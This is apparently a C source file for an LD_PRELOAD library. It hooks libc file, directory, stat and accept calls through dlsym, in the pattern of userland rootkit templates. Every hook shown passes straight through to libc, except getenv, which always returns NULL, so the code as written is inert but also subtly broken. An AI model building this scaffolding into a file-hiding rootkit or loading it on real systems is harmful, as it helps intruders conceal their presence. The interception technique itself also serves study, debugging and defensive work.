#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>
#include "config.h"

void *libc;

void __attribute ((constructor)) init(void)
{
	libc=dlopen(LIBC_PATH, RTLD_LAZY);
}

static int (*old_accept)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
static int (*old_fxstat)(int ver, int fildes, struct stat *buf);
static int (*old_fxstat64)(int ver, int fildes, struct stat64 *buf);
static int (*old_lxstat)(int ver, const char *file, struct stat *buf);
static int (*old_lxstat64)(int ver, const char *file, struct stat64 *buf);
static int (*old_open)(const char *pathname, int flags, mode_t mode);
static int (*old_rmdir)(const char *pathname);
static int (*old_unlink)(const char *pathname);
static int (*old_unlinkat)(int dirfd, const char *pathname, int flags);
static int (*old_xstat)(int ver, const char *path, struct stat *buf);
static int (*old_xstat64)(int ver, const char *path, struct stat64 *buf);
static FILE *(*old_fopen)(const char *filename, const char *mode);
static FILE *(*old_fopen64)(const char *filename, const char *mode);

static DIR *(*old_fdopendir)(int fd);
static DIR *(*old_opendir)(const char *name);

static struct dirent *(*old_readdir)(DIR *dir);
static struct dirent64 *(*old_readdir64)(DIR *dir);

int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{  
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if(!old_accept){
		old_accept = dlsym(libc,"accept");
	}

  	return old_accept(sockfd, addr, addrlen);

}

char *getenv(const char *name)
{
	return 0;
}

FILE *fopen(const char *filename, const char *mode)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if(!old_fopen){
		old_fopen = dlsym(libc, "fopen");
	}

	return old_fopen(filename, mode);
}

FILE *fopen64(const char *filename, const char *mode)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if(!old_fopen64){
		old_fopen64 = dlsym(libc, "fopen64");
	}
 
	return old_fopen64(filename, mode);
}

int fstat(int fd, struct stat *buf)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_fxstat == NULL)
		old_fxstat = dlsym(libc, "__fxstat");

	return old_fxstat(_STAT_VER, fd, buf);
}

int fstat64(int fd, struct stat64 *buf)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_fxstat64 == NULL)
		old_fxstat64 = dlsym(libc, "__fxstat64");
	
	return old_fxstat64(_STAT_VER, fd, buf);
}

int __fxstat(int ver, int fildes, struct stat *buf)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_fxstat == NULL)
		old_fxstat = dlsym(libc, "__fxstat");

	return old_fxstat(ver,fildes, buf);
}

int __fxstat64(int ver, int fildes, struct stat64 *buf)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_fxstat64 == NULL)
		old_fxstat64 = dlsym(libc, "__fxstat64");

	return old_fxstat64(ver, fildes, buf);
}

int lstat(const char *file, struct stat *buf)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_lxstat == NULL)
		old_lxstat = dlsym(libc, "__lxstat");

	return old_lxstat(_STAT_VER, file, buf);
}

int lstat64(const char *file, struct stat64 *buf)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_lxstat64 == NULL)
		old_lxstat64 = dlsym(libc, "__lxstat64");

	return old_lxstat64(_STAT_VER, file, buf);
}

int __lxstat(int ver, const char *file, struct stat *buf)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_lxstat == NULL)
		old_lxstat = dlsym(libc, "__lxstat");

	return old_lxstat(ver, file, buf);
}

int __lxstat64(int ver, const char *file, struct stat64 *buf)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_lxstat64 == NULL)
		old_lxstat64 = dlsym(libc, "__lxstat64");

	return old_lxstat64(ver, file, buf);
}

int open(const char *pathname, int flags, mode_t mode)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_open == NULL)
		old_open = dlsym(libc,"open");

	return old_open(pathname,flags,mode);
}

int rmdir(const char *pathname)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_rmdir == NULL)
		old_rmdir = dlsym(libc,"rmdir");
	
	return old_rmdir(pathname);
}

int stat(const char *path, struct stat *buf)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_xstat == NULL)
		old_xstat = dlsym(libc, "__xstat");

	return old_xstat(_STAT_VER, path, buf);
}

int stat64(const char *path, struct stat64 *buf)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_xstat64 == NULL)
		old_xstat64 = dlsym(libc, "__xstat64");

	return old_xstat64(_STAT_VER, path, buf);
}

int __xstat(int ver, const char *path, struct stat *buf)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_xstat == NULL)
		old_xstat = dlsym(libc, "__xstat");

	return old_xstat(ver,path, buf);
}

int __xstat64(int ver, const char *path, struct stat64 *buf)
{	
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_xstat64 == NULL)
		old_xstat64 = dlsym(libc, "__xstat64");
	
	return old_xstat64(ver,path, buf);
}

int unlink(const char *pathname)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_unlink == NULL)
		old_unlink = dlsym(libc,"unlink");	
	
	return old_unlink(pathname);
}

int unlinkat(int dirfd, const char *pathname, int flags)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_unlinkat == NULL)
		old_unlinkat = dlsym(libc,"unlinkat");
	
	return old_unlinkat(dirfd, pathname, flags);
}

DIR *fdopendir(int fd)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_fdopendir == NULL)
		old_fdopendir = dlsym(libc, "fdopendir");

	return old_fdopendir(fd);
}

DIR *opendir(const char *name)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if (old_opendir == NULL)
		old_opendir = dlsym(libc, "opendir");

	return old_opendir(name);
}

struct dirent *readdir(DIR *dirp)
{
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if(!old_readdir){
		old_readdir = dlsym(libc, "readdir");
    	}

	return old_readdir(dirp);
}

struct dirent64 *readdir64(DIR *dirp)
{	
	if (!libc) {
		libc=dlopen(LIBC_PATH, RTLD_LAZY);
	}
	if(!old_readdir64){
		old_readdir64 = dlsym(libc, "readdir64");
	}

	return old_readdir64(dirp);
}

